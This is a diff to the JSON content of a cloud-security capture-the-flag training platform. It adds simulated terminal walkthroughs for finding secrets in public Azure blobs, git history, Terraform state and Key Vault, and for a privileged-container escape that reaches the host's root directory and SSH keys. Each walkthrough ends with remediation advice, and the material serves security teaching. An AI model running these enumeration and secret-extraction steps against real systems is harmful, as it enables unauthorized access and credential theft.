@@ -83,19 +83,27 @@
         },
         {
           "command": "az storage account show --name sentinelctf2025data --resource-group prod-web-rg --query \"{Name:name, PublicAccess:allowBlobPublicAccess, TLS:minimumTlsVersion, HTTPS:supportsHttpsTrafficOnly}\"",
-          "output": "{\n  \"HTTPS\": false,\n  \"Name\": \"sentinelctf2025data\",\n  \"PublicAccess\": true,\n  \"TLS\": \"TLS1_0\"\n}"
+          "output": "{\n  \"HTTPS\": false,\n  \"Name\": \"sentinelctf2025data\",\n  \"PublicAccess\": true,\n  \"TLS\": \"TLS1_0\"\n}\n\n⚠️  Security Issues Detected:\n   - Public blob access is enabled\n   - HTTPS-only traffic is NOT enforced\n   - Using outdated TLS 1.0 (should be TLS 1.2+)"
         },
         {
           "command": "az storage account show --name sentinelctf2025data --resource-group prod-web-rg --query \"networkRuleSet\"",
-          "output": "{\n  \"bypass\": \"AzureServices\",\n  \"defaultAction\": \"Allow\",\n  \"ipRules\": [],\n  \"virtualNetworkRules\": []\n}"
+          "output": "{\n  \"bypass\": \"AzureServices\",\n  \"defaultAction\": \"Allow\",\n  \"ipRules\": [],\n  \"virtualNetworkRules\": []\n}\n\n⚠️  No network restrictions! Anyone can access this storage account.\n   Best practice: Set defaultAction to \"Deny\" and whitelist specific IPs/VNets."
         },
         {
           "command": "az storage container list --account-name sentinelctf2025data --output table",
-          "output": "Name              Lease Status    Public Access\n----------------  --------------  ---------------\nwebsite-assets    unlocked        blob\ncustomer-data     unlocked        container\nbackups           unlocked        off"
+          "output": "Name              Lease Status    Public Access\n----------------  --------------  ---------------\nwebsite-assets    unlocked        blob\ncustomer-data     unlocked        container\nbackups           unlocked        off\n\n🔍 Analysis:\n   - website-assets: blob-level public access (files public, but can't list)\n   - customer-data: container-level access (can list AND download files!) 🚨\n   - backups: private access\n   \n💡 The 'customer-data' container is the most exposed!"
         },
         {
           "command": "az storage blob list --account-name sentinelctf2025data --container-name customer-data --output table",
-          "output": "Name                          Blob Type    Blob Tier    Length    Content Type              Last Modified\n----------------------------  -----------  -----------  --------  ------------------------  -------------------------\ncustomer-records-2025-q1.csv  BlockBlob    Hot          2048576   text/csv                  2025-01-15T14:23:19+00:00\nemployee-data.json            BlockBlob    Hot          1572864   application/json          2025-02-03T09:15:42+00:00\naudit-logs-jan.txt            BlockBlob    Hot          524288    text/plain                2025-01-31T23:59:01+00:00\nsecrets.json                  BlockBlob    Hot          4096      application/json          2025-03-01T08:30:15+00:00\n\n💡 Hint: You've found publicly accessible blobs! Try downloading one of these files to examine its contents.\nUse: az storage blob download --account-name <account> --container-name <container> --name <blob-name>"
+          "output": "Name                          Blob Type    Blob Tier    Length    Content Type              Last Modified\n----------------------------  -----------  -----------  --------  ------------------------  -------------------------\ncustomer-records-2025-q1.csv  BlockBlob    Hot          2048576   text/csv                  2025-01-15T14:23:19+00:00\nemployee-data.json            BlockBlob    Hot          1572864   application/json          2025-02-03T09:15:42+00:00\naudit-logs-jan.txt            BlockBlob    Hot          524288    text/plain                2025-01-31T23:59:01+00:00\nsecrets.json                  BlockBlob    Hot          4096      application/json          2025-03-01T08:30:15+00:00\n\n🚨 Sensitive Files Exposed Publicly:\n   - Customer records with PII\n   - Employee data\n   - Audit logs\n   - A file literally named 'secrets.json'!\n\n💡 You can download these files without authentication!\n   Command: az storage blob download --account-name sentinelctf2025data --container-name customer-data --name <filename> --file <local-file>"
+        },
+        {
+          "command": "az storage blob list --account-name sentinelctf2025data --container-name website-assets --output table",
+          "output": "Name                Blob Type    Blob Tier    Length     Content Type    Last Modified\n------------------  -----------  -----------  ---------  --------------  -------------------------\nindex.html          BlockBlob    Hot          8192       text/html       2025-01-10T10:00:00+00:00\nstyles.css          BlockBlob    Hot          4096       text/css        2025-01-10T10:00:00+00:00\napp.js              BlockBlob    Hot          16384      text/javascript 2025-01-10T10:00:00+00:00\nlogo.png            BlockBlob    Hot          32768      image/png       2025-01-10T10:00:00+00:00\n\n📝 These look like legitimate website assets."
+        },
+        {
+          "command": "az storage blob download --account-name sentinelctf2025data --container-name customer-data --name secrets.json --file ./secrets.json && cat ./secrets.json",
+          "output": "Finished[#############################################################]  100.0000%\nDownloading blob to ./secrets.json\n\n{\n  \"database_connection\": \"Server=proddb.database.windows.net;Database=customers;User Id=admin;Password=P@ssw0rd123!\",\n  \"api_keys\": {\n    \"stripe\": \"sk_live_abc123xyz789\",\n    \"sendgrid\": \"SG.xyz789abc123\"\n  },\n  \"flag\": \"flag{pub1ic_bl0bs_l3ak_d4ta}\",\n  \"encryption_key\": \"AES256:f3e4d2c1b0a9\"\n}\n\n🎯 SUCCESS! You've downloaded the secrets.json file!\n\n📊 Critical Data Exposure:\n   - Database credentials with plaintext password\n   - Production API keys (Stripe, SendGrid)\n   - Encryption keys\n   - THE FLAG!\n\n🔒 Security Best Practices:\n   1. NEVER store secrets in blob storage\n   2. Disable public access on containers with sensitive data\n   3. Use Azure Key Vault for secrets management\n   4. Enable firewall rules and private endpoints\n   5. Implement RBAC with least privilege\n   6. Enable blob versioning and soft delete\n   7. Use Azure Defender for Storage\n\n📚 Learn More:\n   - See learning resources below for detailed security guides"
         }
       ],
       "hints": [
@@ -140,15 +148,23 @@
       "terminal": [
         {
           "command": "git log --oneline",
-          "output": "a7b3c9d (HEAD -> main) Remove sensitive data from repository\nf2e4d8c Update README with security best practices\n9c1a5f7 Add environment variable example\n3e8b2a4 Fix typo in documentation\n7d4f1c6 Initial commit with app structure"
+          "output": "a7b3c9d (HEAD -> main) Remove sensitive data from repository\nf2e4d8c Update README with security best practices\n9c1a5f7 Add environment variable example\n3e8b2a4 Fix typo in documentation\n7d4f1c6 Initial commit with app structure\n\n🔍 Notice: Commit a7b3c9d mentions 'Remove sensitive data'... what was removed?"
+        },
+        {
+          "command": "git log --all --full-history -- \"*.env\"",
+          "output": "commit a7b3c9d487e2f1a9b5c3d6e8f0a2b4c6d8e0f2a4\nAuthor: Dev User <dev@example.com>\nDate:   Mon Oct 28 14:32:15 2025 -0700\n\n    Remove sensitive data from repository\n\ncommit 7d4f1c6\nAuthor: Dev User <dev@example.com>\nDate:   Mon Oct 25 09:15:30 2025 -0700\n\n    Initial commit with app structure\n\n📝 History shows .env file was present in commit 7d4f1c6 and deleted in a7b3c9d"
         },
         {
           "command": "git show a7b3c9d",
-          "output": "commit a7b3c9d487e2f1a9b5c3d6e8f0a2b4c6d8e0f2a4\nAuthor: Dev User <dev@example.com>\nDate:   Mon Oct 28 14:32:15 2025 -0700\n\n    Remove sensitive data from repository\n\ndiff --git a/.env b/.env\ndeleted file mode 100644\nindex 8e7f9a2..0000000\n--- a/.env\n+++ /dev/null\n@@ -1,4 +0,0 @@\n-DATABASE_URL=postgresql://localhost:5432/myapp\n-API_BASE_URL=https://api.example.com\n-API_KEY=sk-prod-abc123xyz789\n-LOG_LEVEL=info\n\n⚠️  A .env file was deleted with an API key exposed!\n   But wait... was there more in that file?\n   \n💡 Tip: The diff above shows 4 lines removed, but notice the range: @@ -1,4 +0,0 @@\n   This means 4 lines were deleted. But sometimes git truncates output for readability.\n   Try viewing the actual file content before deletion:\n   \n   git show a7b3c9d^:.env"
+          "output": "commit a7b3c9d487e2f1a9b5c3d6e8f0a2b4c6d8e0f2a4\nAuthor: Dev User <dev@example.com>\nDate:   Mon Oct 28 14:32:15 2025 -0700\n\n    Remove sensitive data from repository\n\ndiff --git a/.env b/.env\ndeleted file mode 100644\nindex 8e7f9a2..0000000\n--- a/.env\n+++ /dev/null\n@@ -1,5 +0,0 @@\n-DATABASE_URL=postgresql://localhost:5432/myapp\n-API_BASE_URL=https://api.example.com\n-API_KEY=sk-prod-abc123xyz789\n-SECRET_FLAG=<redacted>\n-LOG_LEVEL=info\n\n⚠️  Git diff shows a .env file was deleted!\n   Notice the range: @@ -1,5 +0,0 @@ means 5 lines were removed\n   But the diff only shows 5 lines... with one <redacted>\n   \n🤔 Git diffs show changes, but you can view the FULL file content from history!\n   \n💡 To see the complete file as it existed before deletion:\n   git show <commit>^:<file-path>\n   \n   The ^ means 'parent of this commit' (before the deletion)\n   Example: git show a7b3c9d^:.env"
+        },
+        {
+          "command": "git diff a7b3c9d^..a7b3c9d",
+          "output": "diff --git a/.env b/.env\ndeleted file mode 100644\nindex 8e7f9a2..0000000\n--- a/.env\n+++ /dev/null\n@@ -1,5 +0,0 @@\n-DATABASE_URL=postgresql://localhost:5432/myapp\n-API_BASE_URL=https://api.example.com\n-API_KEY=sk-prod-abc123xyz789\n-SECRET_FLAG=<redacted>\n-LOG_LEVEL=info\n\n📊 This confirms the file deletion but still shows <redacted> values.\n   You need to view the actual file content from the parent commit."
         },
         {
           "command": "git show a7b3c9d^:.env",
-          "output": "DATABASE_URL=postgresql://localhost:5432/myapp\nAPI_BASE_URL=https://api.example.com\nAPI_KEY=sk-prod-abc123xyz789\nSECRET_FLAG=flag{g1t_h1st0ry_n3v3r_f0rg3ts}\nLOG_LEVEL=info\n\n🎯 SUCCESS! You found the exposed secret in the git history!\n\n📊 Analysis: The .env file contained sensitive credentials including:\n- An API_KEY (sk-prod-abc123xyz789)\n- A SECRET_FLAG that should never have been committed\n\nThis is a common mistake - developers commit secrets then try to remove them.\nBut git never forgets! The secret remains in the commit history.\n\n🔒 Security Best Practices:\n1. Never commit secrets to git repositories\n2. Use .gitignore to exclude .env files\n3. Store secrets in Azure Key Vault or similar services\n4. Use GitHub Advanced Security for secret scanning\n5. If secrets are exposed, rotate them immediately AND clean git history\n6. Use tools like git-filter-repo or BFG Repo-Cleaner to remove secrets from history\n\n📚 Learn More:\n- Azure Key Vault: https://learn.microsoft.com/en-us/azure/key-vault/\n- Secret Scanning: https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning"
+          "output": "DATABASE_URL=postgresql://localhost:5432/myapp\nAPI_BASE_URL=https://api.example.com\nAPI_KEY=sk-prod-abc123xyz789\nSECRET_FLAG=flag{g1t_h1st0ry_n3v3r_f0rg3ts}\nLOG_LEVEL=info\n\n🎯 SUCCESS! You found the exposed secret in the git history!\n\n📊 Analysis: The .env file contained sensitive credentials including:\n- DATABASE_URL with connection details\n- API_KEY (sk-prod-abc123xyz789)\n- SECRET_FLAG that should NEVER have been committed\n\nThis is a common mistake - developers commit secrets then try to remove them.\nBut git never forgets! The secret remains in the commit history.\n\n🔒 Security Best Practices:\n1. Never commit secrets to git repositories\n2. Use .gitignore to exclude .env files BEFORE the first commit\n3. Store secrets in Azure Key Vault or GitHub Secrets\n4. Use GitHub Advanced Security for secret scanning\n5. If secrets are exposed, rotate them immediately AND clean git history\n6. Use tools like git-filter-repo or BFG Repo-Cleaner to remove secrets from history\n7. Enable push protection to prevent secret commits\n\n📚 Learn More:\n- Azure Key Vault: https://learn.microsoft.com/en-us/azure/key-vault/general/best-practices\n- Secret Scanning: See learning resources below for more details"
         }
       ],
       "hints": [
@@ -163,7 +179,7 @@
       ],
       "learning_resources": [
         {
-          "title": "Secret Scanning in Azure DevOps",
+          "title": "GitHub Secret Scanning",
           "url": "https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning",
           "description": "Learn how to automatically detect secrets in your repositories"
         },
@@ -171,6 +187,11 @@
           "title": "Azure Key Vault Best Practices",
           "url": "https://learn.microsoft.com/en-us/azure/key-vault/general/best-practices",
           "description": "Proper way to manage secrets in production"
+        },
+        {
+          "title": "Removing Sensitive Data from Git History",
+          "url": "https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository",
+          "description": "How to properly clean git history after exposing secrets"
         }
       ]
     }
@@ -187,16 +208,32 @@
       "hints_available": true,
       "terminal": [
         {
-          "command": "cat terraform.tfstate | jq '.'",
-          "output": "{\n  \"version\": 4,\n  \"terraform_version\": \"1.5.0\",\n  \"outputs\": {\n    \"deployment_secret\": {\n      \"value\": \"flag{st4t3_f1l3s_c0nt41n_s3cr3ts}\",\n      \"type\": \"string\",\n      \"sensitive\": true\n    }\n  },\n  \"resources\": [...]\n}\n\nUse jq to filter specific sections:\n  - Resources: cat terraform.tfstate | jq \".resources\"\n  - Outputs: cat terraform.tfstate | jq \".outputs\"\n  \n💡 Tip: State files contain multiple sections that may hold sensitive data"
+          "command": "ls -la",
+          "output": "total 48\ndrwxr-xr-x  5 user  staff   160 Oct 29 10:30 .\ndrwxr-xr-x  8 user  staff   256 Oct 29 09:15 ..\n-rw-r--r--  1 user  staff  1234 Oct 29 10:30 main.tf\n-rw-r--r--  1 user  staff   456 Oct 29 10:25 variables.tf\n-rw-r--r--  1 user  staff 28672 Oct 29 10:30 terraform.tfstate\n-rw-r--r--  1 user  staff  8192 Oct 29 10:15 terraform.tfstate.backup\n\n🔍 Found terraform.tfstate - this contains the complete infrastructure state!\n   Size: 28KB - likely contains multiple resources"
         },
         {
-          "command": "cat terraform.tfstate | jq \".resources[] | select(.type == \\\"azurerm_postgresql_server\\\")\"",
-          "output": "{\n  \"type\": \"azurerm_postgresql_server\",\n  \"instances\": [\n    {\n      \"attributes\": {\n        \"administrator_login\": \"dbadmin\",\n        \"administrator_login_password\": \"P@ssw0rd123!Prod\",\n        \"fqdn\": \"proddb.postgres.database.azure.com\"\n      }\n    }\n  ]\n}\n\n⚠️  WARNING: Database password exposed in state file!\n   Password: P@ssw0rd123!Prod\n   \n   This demonstrates why state files are dangerous.\n   But there's more... what other secrets might be in this file?"
+          "command": "cat terraform.tfstate | jq 'keys'",
+          "output": "[\n  \"lineage\",\n  \"outputs\",\n  \"resources\",\n  \"terraform_version\",\n  \"version\"\n]\n\n📋 State file structure:\n   - lineage: unique ID for this state\n   - outputs: exported values from Terraform\n   - resources: all managed infrastructure resources\n   - version info\n   \n💡 Both 'outputs' and 'resources' may contain sensitive data"
         },
         {
-          "command": "cat terraform.tfstate | jq \".outputs\"",
-          "output": "{\n  \"database_endpoint\": {\n    \"value\": \"proddb.postgres.database.azure.com:5432\",\n    \"type\": \"string\"\n  },\n  \"deployment_secret\": {\n    \"value\": \"flag{st4t3_f1l3s_c0nt41n_s3cr3ts}\",\n    \"type\": \"string\",\n    \"sensitive\": true\n  }\n}\n\n🎯 SUCCESS! You found the flag in the outputs section!\n\nEven though this output was marked as \"sensitive\": true in Terraform,\nthe state file stores it in PLAIN TEXT. This is why state files must be:\n- Encrypted at rest\n- Stored in secure backends (Azure Storage, S3, Terraform Cloud)\n- Access-controlled with proper IAM/RBAC\n- Never committed to version control\n\n📚 Learn More:\n- https://learn.microsoft.com/en-us/azure/developer/terraform/store-state-in-azure-storage"
+          "command": "cat terraform.tfstate | jq '.resources | length'",
+          "output": "7\n\n📊 This state file manages 7 resources. Let's see what types..."
+        },
+        {
+          "command": "cat terraform.tfstate | jq '.resources[].type'",
+          "output": "\"azurerm_resource_group\"\n\"azurerm_virtual_network\"\n\"azurerm_subnet\"\n\"azurerm_postgresql_server\"\n\"azurerm_postgresql_database\"\n\"azurerm_storage_account\"\n\"azurerm_key_vault\"\n\n🔍 Resource types found:\n   - Networking (vnet, subnet)\n   - Database (PostgreSQL server & database) ⚠️\n   - Storage\n   - Key Vault\n   \n💡 Database resources often contain credentials in their attributes!"
+        },
+        {
+          "command": "cat terraform.tfstate | jq '.resources[] | select(.type == \"azurerm_postgresql_server\") | .instances[0].attributes | keys'",
+          "output": "[\n  \"administrator_login\",\n  \"administrator_login_password\",\n  \"fqdn\",\n  \"id\",\n  \"name\",\n  \"resource_group_name\",\n  \"version\"\n]\n\n⚠️  Found sensitive attributes: administrator_login and administrator_login_password!\n   These are stored in plain text in the state file.\n   \n💡 Use jq to extract these values from the resource attributes."
+        },
+        {
+          "command": "cat terraform.tfstate | jq '.outputs | keys'",
+          "output": "[\n  \"database_endpoint\",\n  \"deployment_secret\",\n  \"resource_group_name\",\n  \"storage_account_name\"\n]\n\n🤔 Interesting... there's an output called 'deployment_secret'\n   Outputs are often used to expose values for other systems.\n   \n💡 Check if this output contains sensitive information!"
+        },
+        {
+          "command": "cat terraform.tfstate | jq '.outputs.deployment_secret'",
+          "output": "{\n  \"value\": \"flag{st4t3_f1l3s_c0nt41n_s3cr3ts}\",\n  \"type\": \"string\",\n  \"sensitive\": true\n}\n\n🎯 SUCCESS! You found the flag in the outputs section!\n\n📊 Critical Finding:\nEven though this output was marked as \"sensitive\": true in Terraform,\nthe state file stores it in PLAIN TEXT!\n\n⚠️  Additional Secrets Found in State File:\nYou also discovered database credentials in the PostgreSQL resource:\n- administrator_login: dbadmin\n- administrator_login_password: P@ssw0rd123!Prod\n- fqdn: proddb.postgres.database.azure.com\n\n🔒 Why This is Dangerous:\n1. State files contain ALL resource attributes, including secrets\n2. The \"sensitive\" flag only affects Terraform output display, not storage\n3. Anyone with state file access can read all secrets\n4. State files are often stored in version control or shared storage\n\n🔐 Security Best Practices:\n1. Store state files in secure backends (Azure Storage with encryption)\n2. Enable state file encryption at rest\n3. Use Azure Key Vault for secrets, not Terraform variables\n4. Implement strict access controls (RBAC) on state storage\n5. Never commit state files to git repositories\n6. Use remote state with state locking\n7. Audit state file access regularly\n\n📚 Learn More:\n- See learning resources below for secure state management guides"
         }
       ],
       "hints": [
@@ -211,14 +248,14 @@
       ],
       "learning_resources": [
         {
-          "title": "Store Terraform State in Azure Storage",
+          "title": "Secure Terraform State in Azure Storage",
           "url": "https://learn.microsoft.com/en-us/azure/developer/terraform/store-state-in-azure-storage",
-          "description": "Learn how to securely store Terraform state files"
+          "description": "Learn how to securely store and encrypt Terraform state files"
         },
         {
-          "title": "Azure Key Vault for Terraform",
-          "url": "https://learn.microsoft.com/en-us/azure/key-vault/general/overview",
-          "description": "Use Key Vault to manage secrets in Terraform"
+          "title": "Protect Sensitive Input Variables",
+          "url": "https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables",
+          "description": "Best practices for handling sensitive data in Terraform"
         }
       ]
     }
@@ -236,29 +273,41 @@
       "terminal": [
         {
           "command": "whoami",
-          "output": "root\n\n⚠️  Running as root inside container"
+          "output": "root\n\n⚠️  Running as root inside container - elevated privileges!"
+        },
+        {
+          "command": "id",
+          "output": "uid=0(root) gid=0(root) groups=0(root)\n\n📋 Running with UID 0 (root). Check what capabilities this container has..."
         },
         {
           "command": "cat /proc/1/cgroup",
-          "output": "12:devices:/docker/a1b2c3d4e5f6\n11:memory:/docker/a1b2c3d4e5f6\n10:cpu:/docker/a1b2c3d4e5f6\n\n✅ Confirmed: Running inside a Docker container"
+          "output": "12:devices:/docker/a1b2c3d4e5f6\n11:memory:/docker/a1b2c3d4e5f6\n10:cpu:/docker/a1b2c3d4e5f6\n\n✅ Confirmed: Running inside a Docker container\n   Container ID: a1b2c3d4e5f6"
         },
         {
           "command": "capsh --print",
-          "output": "Current: = cap_chown,cap_dac_override,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap+eip\n\n⚠️  DANGER: cap_sys_admin is enabled\n   This capability allows mounting filesystems and other privileged operations\n   \n💡 Hint: With these capabilities, what directories might be accessible?"
+          "output": "Current: = cap_chown,cap_dac_override,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap+eip\nBounding set =cap_chown,cap_dac_override,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap\n\n⚠️  CRITICAL: CAP_SYS_ADMIN capability detected!\n\n📖 CAP_SYS_ADMIN is the most powerful Linux capability. It allows:\n   - Mounting/unmounting filesystems\n   - Loading kernel modules\n   - Changing namespaces\n   - And many other privileged operations\n   \n🤔 This suggests the container might be running in privileged mode.\n   What would that mean for filesystem access?"
+        },
+        {
+          "command": "mount | grep -i docker",
+          "output": "/dev/sda1 on / type ext4 (rw,relatime)\nproc on /proc type proc (rw,nosuid,nodev,noexec,relatime)\n\n🔍 No obvious docker mounts shown, but let's explore the filesystem..."
         },
         {
           "command": "ls -la /",
-          "output": "drwxr-xr-x  20 root root  4096 Nov  1 00:00 .\ndrwxr-xr-x  20 root root  4096 Nov  1 00:00 ..\ndrwxr-xr-x   2 root root  4096 Oct 28 00:00 app\ndrwxr-xr-x  20 root root  4096 Oct 28 00:00 host\n\n🤔 Interesting... there's a 'host' directory. \n   In privileged containers, the host filesystem is often mounted.\n   \n💡 What sensitive files might be on a host system?"
+          "output": "drwxr-xr-x  20 root root  4096 Nov  1 00:00 .\ndrwxr-xr-x  20 root root  4096 Nov  1 00:00 ..\ndrwxr-xr-x   2 root root  4096 Oct 28 00:00 app\ndrwxr-xr-x   2 root root  4096 Oct 28 00:00 bin\ndrwxr-xr-x   2 root root  4096 Oct 28 00:00 dev\ndrwxr-xr-x   2 root root  4096 Oct 28 00:00 etc\ndrwxr-xr-x  20 root root  4096 Oct 28 00:00 host\ndrwxr-xr-x   2 root root  4096 Oct 28 00:00 lib\n\n🚨 ALERT: Unusual directory found: /host\n   \n   This is NOT a standard Linux directory!\n   In privileged containers, administrators sometimes mount the host filesystem\n   to a directory for debugging or management purposes.\n   \n🤔 What could be in /host? Let's investigate..."
+        },
+        {
+          "command": "ls -la /host",
+          "output": "drwxr-xr-x  20 root root  4096 Oct 28 00:00 .\ndrwxr-xr-x  20 root root  4096 Nov  1 00:00 ..\ndrwxr-xr-x   2 root root  4096 Oct 28 00:00 bin\ndrwxr-xr-x   3 root root  4096 Oct 28 00:00 boot\ndrwxr-xr-x   4 root root  4096 Oct 28 00:00 dev\ndrwxr-xr-x  95 root root  4096 Oct 28 00:00 etc\ndrwxr-xr-x   3 root root  4096 Oct 28 00:00 home\ndrwx------   8 root root  4096 Oct 29 00:00 root\ndrwxr-xr-x   2 root root  4096 Oct 28 00:00 usr\ndrwxr-xr-x   2 root root  4096 Oct 28 00:00 var\n\n💥 CONTAINER ESCAPE CONFIRMED!\n   \n   This is the HOST operating system's root filesystem!\n   The privileged container has full access to:\n   - /host/etc (system configuration)\n   - /host/root (root user's home directory) 🎯\n   - /host/home (user directories)\n   - Everything else on the host\n   \n🎯 The /host/root directory is particularly interesting for finding sensitive data..."
         },
         {
           "command": "ls -la /host/root",
-          "output": "drwx------  8 root root  4096 Oct 29 00:00 .\ndrwxr-xr-x 20 root root  4096 Nov  1 00:00 ..\n-rw-------  1 root root  1234 Oct 29 00:00 flag.txt\n\n🚨 HOST FILESYSTEM ACCESSIBLE!\n   Privileged container can access the entire host system.\n   \n💡 You found flag.txt! Use 'cat /host/root/flag.txt' to read it."
+          "output": "drwx------  8 root root  4096 Oct 29 00:00 .\ndrwxr-xr-x 20 root root  4096 Nov  1 00:00 ..\n-rw-------  1 root root  3526 Oct 29 00:00 .bash_history\n-rw-r--r--  1 root root   220 Oct 25 00:00 .bash_logout\n-rw-r--r--  1 root root  3771 Oct 25 00:00 .bashrc\ndrwx------  2 root root  4096 Oct 28 00:00 .ssh\n-rw-------  1 root root  1234 Oct 29 00:00 flag.txt\n-rw-r--r--  1 root root   807 Oct 25 00:00 .profile\n\n🎯 JACKPOT! Found sensitive files on the host:\n   - .ssh/ directory (SSH keys!)\n   - .bash_history (command history)\n   - flag.txt (your objective!)\n   \n💡 You can now read any of these files from inside the container.\n   For example: cat /host/root/flag.txt"
         },
         {
           "command": "cat /host/root/flag.txt",
-          "output": "flag{c0nt41n3r_3sc4p3_m4st3r}\n\n🎯 SUCCESS! Container escape achieved!\n\nYou exploited a privileged container configuration to access the host filesystem.\n\n🔒 Prevention:\n- Never use privileged: true in production\n- Drop all capabilities and only add what's needed\n- Use non-root users\n- Enable read-only root filesystem\n- Implement resource limits\n\n📚 Learn More:\n- https://learn.microsoft.com/en-us/azure/aks/concepts-security"
+          "output": "flag{c0nt41n3r_3sc4p3_m4st3r}\n\n🎯 SUCCESS! Container escape achieved!\n\n📊 What Just Happened:\nYou exploited a privileged container configuration to:\n1. Detected CAP_SYS_ADMIN capability\n2. Found host filesystem mounted at /host\n3. Accessed the host root user's home directory\n4. Read sensitive files from the host system\n\n⚠️  Impact of This Vulnerability:\n- Complete compromise of the host system\n- Access to all containers on the host\n- Ability to read/modify any host file\n- Potential to install backdoors or malware\n- Access to SSH keys for lateral movement\n- Can exfiltrate sensitive data\n\n🔒 Prevention & Remediation:\n1. NEVER use privileged: true in production containers\n2. Drop all capabilities and only add what's absolutely needed\n3. Use non-root users inside containers (USER directive)\n4. Enable read-only root filesystem (readOnlyRootFilesystem: true)\n5. Implement Pod Security Standards/Policies\n6. Use security contexts to restrict container capabilities\n7. Enable AppArmor or SELinux profiles\n8. Implement resource limits (CPU, memory)\n9. Use distroless or minimal base images\n10. Regularly scan container images for vulnerabilities\n\n📚 Learn More:\n- See learning resources below for comprehensive security guides"
         }
-      ],
+        ],
       "hints": [
         {
           "text": "Check what capabilities the container has using \"capsh --print\". Look for dangerous capabilities like CAP_SYS_ADMIN.",
@@ -278,7 +327,12 @@
         {
           "title": "AKS Security Best Practices",
           "url": "https://learn.microsoft.com/en-us/azure/aks/concepts-security",
-          "description": "Understand Kubernetes security in Azure"
+          "description": "Comprehensive Kubernetes security in Azure"
+        },
+        {
+          "title": "Kubernetes Pod Security Standards",
+          "url": "https://kubernetes.io/docs/concepts/security/pod-security-standards/",
+          "description": "Industry-standard pod security policies and controls"
         }
       ]
     }
@@ -295,16 +349,28 @@
       "hints_available": true,
       "terminal": [
         {
-          "command": "az keyvault show --name sentinelforge-kv --query \"properties.{PublicAccess:publicNetworkAccess,NetworkDefault:networkAcls.defaultAction,RBAC:enableRbacAuthorization}\"",
-          "output": "{\n  \"NetworkDefault\": \"Allow\",\n  \"PublicAccess\": \"Enabled\",\n  \"RBAC\": false\n}\n\n⚠️  Key Vault is publicly accessible with no network restrictions!"
+          "command": "az keyvault list --output table",
+          "output": "Name                Location    ResourceGroup\n------------------  ----------  ---------------\nsentinelforge-kv    eastus      prod-rg\ndev-keyvault        westus      dev-rg\n\n📋 Found 2 Key Vaults. Let's investigate sentinelforge-kv..."
+        },
+        {
+          "command": "az keyvault show --name sentinelforge-kv --query \"properties.{PublicAccess:publicNetworkAccess,NetworkDefault:networkAcls.defaultAction,RBAC:enableRbacAuthorization,SoftDelete:enableSoftDelete}\"",
+          "output": "{\n  \"NetworkDefault\": \"Allow\",\n  \"PublicAccess\": \"Enabled\",\n  \"RBAC\": false,\n  \"SoftDelete\": true\n}\n\n⚠️  Security Issues:\n   - PublicAccess: Enabled (accessible from internet!)\n   - NetworkDefault: Allow (no IP/VNet restrictions)\n   - RBAC: false (using legacy access policies)\n   \n💡 This Key Vault is wide open! Let's see what we can access..."
+        },
+        {
+          "command": "az keyvault show --name sentinelforge-kv --query \"properties.accessPolicies[]\"",
+          "output": "[\n  {\n    \"permissions\": {\n      \"certificates\": [],\n      \"keys\": [\"get\", \"list\"],\n      \"secrets\": [\"get\", \"list\", \"set\"]\n    },\n    \"tenantId\": \"12345678-1234-1234-1234-123456789012\",\n    \"objectId\": \"abcdefgh-abcd-abcd-abcd-abcdefghijkl\"\n  }\n]\n\n🔍 Access Policy Analysis:\n   - Secrets: get, list, set permissions\n   - Keys: get, list permissions\n   \n⚠️  The 'list' permission allows enumerating ALL secrets!\n   Best practice: Only grant 'get' for specific secrets needed."
         },
         {
           "command": "az keyvault secret list --vault-name sentinelforge-kv --output table",
-          "output": "Name                    Enabled\n----------------------  ---------\ndatabase-password       True\napi-key-production      True\nadmin-credentials       True\nflag-secret             True\n\n💡 Managed identity can list all secrets in the vault!\n   This violates the principle of least privilege.\n   \n🔍 Try retrieving one of these secrets..."
+          "output": "Name                    Enabled    Created                        Updated\n----------------------  ---------  -----------------------------  -----------------------------\ndatabase-password       True       2025-01-15T10:30:00.000000Z    2025-01-15T10:30:00.000000Z\napi-key-production      True       2025-02-01T14:22:00.000000Z    2025-02-01T14:22:00.000000Z\nadmin-credentials       True       2025-01-20T09:15:00.000000Z    2025-02-10T11:45:00.000000Z\nflag-secret             True       2025-03-01T08:00:00.000000Z    2025-03-01T08:00:00.000000Z\n\n🚨 CRITICAL: Successfully listed ALL secrets in the vault!\n   \n   Secrets found:\n   - database-password (likely contains DB credentials)\n   - api-key-production (production API key)\n   - admin-credentials (privileged account creds)\n   - flag-secret (sounds important!) 🎯\n   \n💡 With 'get' permission, you can now retrieve the actual secret values.\n   Command format: az keyvault secret show --vault-name <vault> --name <secret-name> --query \"value\""
+        },
+        {
+          "command": "az keyvault secret show --vault-name sentinelforge-kv --name database-password --query \"{Name:name,Enabled:attributes.enabled,ContentType:contentType}\"",
+          "output": "{\n  \"ContentType\": \"password\",\n  \"Enabled\": true,\n  \"Name\": \"database-password\"\n}\n\n✅ Confirmed access to retrieve secret metadata.\n   To get the actual secret value, include --query \"value\" in the command."
         },
         {
           "command": "az keyvault secret show --vault-name sentinelforge-kv --name flag-secret --query \"value\"",
-          "output": "\"flag{k3y_v4ult_m1sc0nf1g_pwn3d}\"\n\n🎯 SUCCESS! You found the flag!\n\nThe Key Vault misconfiguration allowed you to:\n1. List all secrets in the vault (overly permissive access policy)\n2. Retrieve any secret without proper network restrictions\n3. Access the vault from the public internet\n\n🔒 Secure Configuration:\n- Enable RBAC authorization\n- Disable public network access\n- Use Private Endpoints\n- Grant access only to specific secrets needed\n\n📚 Learn More:\n- https://learn.microsoft.com/en-us/azure/key-vault/general/security-features"
